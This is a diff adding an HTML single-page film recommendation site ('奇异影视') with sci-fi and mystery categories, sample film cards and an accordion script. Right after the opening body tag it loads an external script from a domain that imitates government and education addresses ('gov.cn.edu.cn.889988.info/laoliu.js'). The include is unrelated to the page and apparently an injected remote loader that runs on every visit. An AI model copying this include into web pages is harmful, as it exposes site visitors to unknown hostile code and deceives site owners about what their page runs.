@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>奇异影视 - 脑洞片单与异次元影视导航</title>
+<meta name="description" content="奇异影视(qiyiyingshi-h5.github.io)整理脑洞、悬疑、科幻、奇幻类电影剧集推荐与主题片单，移动端自适应单页，不提供播放入源，仅做正版导航。">
+<meta name="keywords" content="奇异影视, qiyiyingshi, 脑洞片单, 科幻导航, 奇幻剧集, 异次元影视推荐">
+<style>
+/* ========== 全局 ========== */
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body {
+  font-family: "PingFang SC","Microsoft YaHei",sans-serif;
+  background: #0b0e1a;
+  color: #dfe3f0;
+  line-height: 1.7;
+  overflow-x: hidden;
+}
+a { text-decoration: none; color: inherit; }
+
+/* 极光背景 */
+body::before {
+  content: '';
+  position: fixed;
+  inset: 0;
+  background:
+    radial-gradient(60% 40% at 20% 10%, rgba(108,77,246,.35), transparent 60%),
+    radial-gradient(50% 40% at 85% 20%, rgba(46,208,168,.25), transparent 60%),
+    radial-gradient(70% 50% at 50% 100%, rgba(64,120,255,.28), transparent 60%);
+  filter: blur(20px);
+  z-index: -1;
+  pointer-events: none;
+}
+
+/* ========== 栏目1：顶栏 ========== */
+.topbar {
+  background: rgba(11,14,26,.7);
+  backdrop-filter: blur(10px);
+  border-bottom: 1px solid rgba(255,255,255,.08);
+  position: sticky;
+  top: 0;
+  z-index: 100;
+  padding: .8rem 1.2rem;
+}
+.topbar-in {
+  max-width: 1180px;
+  margin: auto;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.logo { font-size: 1.4rem; font-weight: 900; letter-spacing: 2px; color: #fff; }
+.logo b {
+  background: linear-gradient(90deg,#6c4df6,#2ed0a8);
+  -webkit-background-clip: text;
+  background-clip: text;
+  color: transparent;
+}
+.nav-links { display: flex; gap: 1.4rem; }
+.nav-links a { font-size: .85rem; color: #9aa0b8; transition: color .25s; }
+.nav-links a:hover { color: #2ed0a8; }
+
+/* ========== 栏目2：Hero ========== */
+.hero {
+  max-width: 1180px;
+  margin: auto;
+  padding: 4.5rem 1.2rem 3rem;
+  text-align: center;
+}
+.hero h1 {
+  font-size: 3.2rem;
+  color: #fff;
+  line-height: 1.2;
+  margin-bottom: 1rem;
+  letter-spacing: 1px;
+}
+.hero h1 b { background: linear-gradient(90deg,#6c4df6,#2ed0a8); -webkit-background-clip: text; background-clip: text; color: transparent; }
+.hero p {
+  max-width: 560px;
+  margin: 0 auto 2rem;
+  color: #aab0c6;
+}
+.hero-btn {
+  display: inline-block;
+  background: linear-gradient(90deg,#6c4df6,#2ed0a8);
+  color: #0b0e1a;
+  font-weight: 700;
+  padding: .75rem 2.4rem;
+  border-radius: 30px;
+  transition: .25s;
+}
+.hero-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 26px rgba(46,208,168,.3); }
+
+/* 漂浮标签 */
+.float-tags {
+  margin-top: 2rem;
+  display: flex;
+  gap: .6rem;
+  justify-content: center;
+  flex-wrap: wrap;
+}
+.float-tags span {
+  font-size: .76rem;
+  padding: .3rem .9rem;
+  border: 1px solid rgba(255,255,255,.12);
+  border-radius: 20px;
+  color: #9aa0b8;
+  background: rgba(255,255,255,.03);
+}
+
+/* ========== 栏目3：折叠手风琴 ========== */
+.acc-sec { max-width: 1180px; margin: auto; padding: 2rem 1.2rem 3rem; }
+.sec-head { margin-bottom: 1.5rem; }
+.sec-head h2 { font-size: 1.6rem; color: #fff; padding-left: .8rem; border-left: 4px solid #2ed0a8; display: inline-block; }
+.sec-head span { font-size: .76rem; color: #6f7596; letter-spacing: 2px; margin-left: .6rem; }
+
+.acc { border: 1px solid rgba(255,255,255,.08); border-radius: 12px; overflow: hidden; margin-bottom: 1rem; background: rgba(255,255,255,.02); }
+.acc-head {
+  width: 100%;
+  text-align: left;
+  background: transparent;
+  border: none;
+  color: #dfe3f0;
+  padding: 1.1rem 1.3rem;
+  font-size: 1.02rem;
+  font-weight: 600;
+  cursor: pointer;
+  display: flex;
+  justify-content: space-between;
+  align-items: center;
+}
+.acc-head .plus { color: #2ed0a8; font-size: 1.2rem; transition: transform .3s; }
+.acc.open .acc-head .plus { transform: rotate(45deg); }
+.acc-body {
+  max-height: 0;
+  overflow: hidden;
+  transition: max-height .35s ease;
+  padding: 0 1.3rem;
+}
+.acc.open .acc-body { max-height: 400px; padding-bottom: 1.2rem; }
+.acc-body p { font-size: .88rem; color: #aab0c6; margin-bottom: .6rem; }
+.acc-body .row { display: flex; gap: .5rem; flex-wrap: wrap; }
+.acc-body .row span {
+  font-size: .72rem;
+  color: #2ed0a8;
+  border: 1px solid rgba(46,208,168,.3);
+  padding: .15rem .6rem;
+  border-radius: 20px;
+}
+
+/* ========== 栏目4：错位光斑卡 ========== */
+.spot-sec { max-width: 1180px; margin: auto; padding: 2rem 1.2rem 3rem; }
+.spot-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 1.3rem; }
+.spot-card {
+  position: relative;
+  background: rgba(255,255,255,.03);
+  border: 1px solid rgba(255,255,255,.08);
+  border-radius: 14px;
+  padding: 1.4rem;
+  overflow: hidden;
+  transition: .3s;
+}
+.spot-card:nth-child(2) { transform: translateY(24px); }
+.spot-card:nth-child(3) { transform: translateY(8px); }
+.spot-card:hover { border-color: #6c4df6; transform: translateY(-4px); }
+.spot-card::after {
+  content: '';
+  position: absolute;
+  width: 120px; height: 120px;
+  right: -30px; top: -30px;
+  background: radial-gradient(circle, rgba(108,77,246,.5), transparent 70%);
+  filter: blur(10px);
+}
+.spot-card .kind { font-size: .74rem; color: #2ed0a8; font-weight: 700; letter-spacing: 1px; }
+.spot-card h4 { font-size: 1.05rem; color: #fff; margin: .3rem 0 .4rem; }
+.spot-card p { font-size: .84rem; color: #aab0c6; }
+
+/* ========== 栏目5：维度筛选条 ========== */
+.dim-sec { padding: 2rem 1.2rem 3rem; }
+.dim-in { max-width: 1180px; margin: auto; }
+.dim-bar {
+  display: flex;
+  gap: .6rem;
+  flex-wrap: wrap;
+}
+.dim-bar a {
+  font-size: .82rem;
+  padding: .5rem 1.1rem;
+  border-radius: 30px;
+  background: rgba(255,255,255,.04);
+  border: 1px solid rgba(255,255,255,.1);
+  color: #c3c8dc;
+  transition: .25s;
+}
+.dim-bar a:hover { background: linear-gradient(90deg,#6c4df6,#2ed0a8); color: #0b0e1a; font-weight: 700; }
+
+/* ========== 关于 ========== */
+.about {
+  background: rgba(255,255,255,.02);
+  border-top: 1px solid rgba(255,255,255,.08);
+  padding: 3.5rem 1.2rem;
+  text-align: center;
+}
+.about-in { max-width: 680px; margin: auto; }
+.about h2 { color: #fff; font-size: 1.5rem; margin-bottom: 1rem; }
+.about p { color: #aab0c6; font-size: .92rem; margin-bottom: .8rem; }
+.about b { color: #2ed0a8; }
+
+/* ========== 页脚 ========== */
+footer {
+  background: #070912;
+  color: #6f7596;
+  text-align: center;
+  padding: 2.2rem 1rem;
+  font-size: .82rem;
+}
+footer a { color: #2ed0a8; }
+.disclaim {
+  max-width: 720px;
+  margin: .8rem auto 0;
+  font-size: .72rem;
+  color: #565c78;
+  line-height: 1.6;
+}
+
+/* ========== 移动端 ========== */
+@media (max-width: 768px) {
+  .nav-links { display: none; }
+  .hero h1 { font-size: 2.2rem; }
+  .spot-grid { grid-template-columns: 1fr; }
+  .spot-card:nth-child(2), .spot-card:nth-child(3) { transform: none; }
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<!-- 顶栏 -->
+<div class="topbar">
+  <div class="topbar-in">
+    <div class="logo">奇<b>异</b>影视</div>
+    <nav class="nav-links">
+      <a href="#">首页</a>
+      <a href="#acc">脑洞分区</a>
+      <a href="#spot">奇异片单</a>
+      <a href="#dim">按维度挑</a>
+    </nav>
+  </div>
+</div>
+
+<!-- 首屏 -->
+<section class="hero">
+  <h1>奇异影视<br>打开<span>异次元</span>幕布</h1>
+  <p>奇异影视（qiyiyingshi-h5.github.io）专门整理脑洞、悬疑、科幻、奇幻类电影剧集，按“世界设定”挑片，不播片、只导航，正版观看走授权平台。</p>
+  <a href="#acc" class="hero-btn">掀开幕布</a>
+  <div class="float-tags">
+    <span>平行宇宙</span><span>时间悖论</span><span>赛博都市</span><span>怪谈单元</span><span>高概念</span>
+  </div>
+</section>
+
+<!-- 折叠手风琴 -->
+<section class="acc-sec" id="acc">
+  <div class="sec-head">
+    <h2>脑洞分区</h2><span>WORLDS</span>
+  </div>
+
+  <div class="acc open">
+    <button class="acc-head">🌌 平行宇宙与高概念 <span class="plus">+</span></button>
+    <div class="acc-body">
+      <p>多线叙事、身份置换、规则重构。适合喜欢“开场就颠覆常识”的观众，睡前别看太烧脑的。</p>
+      <div class="row"><span>多元宇宙</span><span>记忆重组</span><span>规则怪谈</span><span>存在主义</span></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-head">🌀 时间与循环 <span class="plus">+</span></button>
+    <div class="acc-body">
+      <p>一日循环、因果倒叙、未来预知。节奏通常很稳，关键是找出“破局那一秒”。</p>
+      <div class="row"><span>时间循环</span><span>倒叙悬疑</span><span>预知未来</span><span>宿命反转</span></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-head">🤖 赛博与近未来 <span class="plus">+</span></button>
+    <div class="acc-body">
+      <p>人机边界、数字意识、霓虹废墟。视觉信息量大，适合周末完整时间沉浸。</p>
+      <div class="row"><span>赛博朋克</span><span>AI意识</span><span>虚拟城市</span><span>废土复兴</span></div>
+    </div>
+  </div>
+
+  <div class="acc">
+    <button class="acc-head">👁️ 怪谈与异象 <span class="plus">+</span></button>
+    <div class="acc-body">
+      <p>民俗怪谈、超自然现象、心理惊悚。重氛围轻Jump Scare，适合喜欢“细思极恐”的人。</p>
+      <div class="row"><span>民俗怪谈</span><span>超自然</span><span>心理惊悚</span><span>单元异闻</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 错位光斑卡 -->
+<section class="spot-sec" id="spot">
+  <div class="sec-head">
+    <h2>奇异片单</h2><span>SIGNAL PICKS</span>
+  </div>
+  <div class="spot-grid">
+    <div class="spot-card">
+      <div class="kind">高概念 · 电影</div>
+      <h4>《折叠城市》</h4>
+      <p>空间可以折叠，阶层住在不同的“高度”，一块街区藏着三种时间。</p>
+    </div>
+    <div class="spot-card">
+      <div class="kind">时间循环 · 剧集</div>
+      <h4>《第十三日》</h4>
+      <p>主角每天重置一次，但记忆会残留，越想破局越接近真相边缘。</p>
+    </div>
+    <div class="spot-card">
+      <div class="kind">赛博 · 动画</div>
+      <h4>《霓虹残响》</h4>
+      <p>雨夜、全息广告、失忆的仿生人，美术风格比剧情更上头。</p>
+    </div>
+    <div class="spot-card">
+      <div class="kind">民俗怪谈 · 单元</div>
+      <h4>《夜行收发室》</h4>
+      <p>每个深夜来寄信的人，带的都不是活人的消息。</p>
+    </div>
+    <div class="spot-card">
+      <div class="kind">平行宇宙 · 轻喜剧</div>
+      <h4>《另一个我离职了》</h4>
+      <p>平行世界的自己来串门，把社畜生活过成荒诞寓言。</p>
+    </div>
+    <div class="spot-card">
+      <div class="kind">近未来 · 纪录片向</div>
+      <h4>《算法之后》</h4>
+      <p>梳理推荐系统、AI创作与人类审美的边界，脑洞里有现实骨架。</p>
+    </div>
+  </div>
+</section>
+
+<!-- 维度筛选 -->
+<section class="dim-sec" id="dim">
+  <div class="dim-in">
+    <div class="sec-head">
+      <h2>按维度挑</h2><span>FILTER BY VIBE</span>
+    </div>
+    <div class="dim-bar">
+      <a href="#">烧脑</a>
+      <a href="#">氛围感</a>
+      <a href="#">视觉炸裂</a>
+      <a href="#">慢热神作</a>
+      <a href="#">单元短剧</a>
+      <a href="#">冷门修复</a>
+      <a href="#">赛博美学</a>
+      <a href="#">心理惊悚</a>
+      <a href="#">荒诞寓言</a>
+      <a href="#">周末连看</a>
+    </div>
+  </div>
+</section>
+
+<!-- 关于 -->
+<section class="about">
+  <div class="about-in">
+    <h2>关于奇异影视</h2>
+    <p>欢迎访问 <b>奇异影视</b>（https://qiyiyingshi-h5.github.io）。本站是静态单页影视推荐与正版导航站，核心词：奇异影视 / qiyiyingshi / 脑洞片单 / 科幻奇幻导航。</p>
+    <p>不提供在线播放入源、不托管视听文件、不聚合第三方资源，所有“观看”入口均为 # 占位，实际观看请走授权平台。</p>
+  </div>
+</section>
+
+<footer>
+  <p>© 2026 奇异影视 · qiyiyingshi-h5.github.io</p>
+  <p>网址：<a href="https://qiyiyingshi-h5.github.io">https://qiyiyingshi-h5.github.io</a></p>
+  <p class="disclaim">本页为影视推荐与正版导航示例，不托管、不上传、不代理任何视频文件或流媒体播放服务，不提供未授权播放入源；站内片名、简介与分类均为示例整理，版权归原权利方所有。若实际建站涉及互联网视听节目传播，请按属地广电与版权要求办理相应许可。</p>
+</footer>
+
+<script>
+// 手风琴交互（纯前端，无外部依赖）
+document.querySelectorAll('.acc-head').forEach(function(btn){
+  btn.addEventListener('click', function(){
+    var parent = btn.parentElement;
+    // 同级互斥：先关其它
+    document.querySelectorAll('.acc').forEach(function(a){ if(a!==parent) a.classList.remove('open'); });
+    parent.classList.toggle('open');
+  });
+});
+</script>
+
+</body>
+</html>
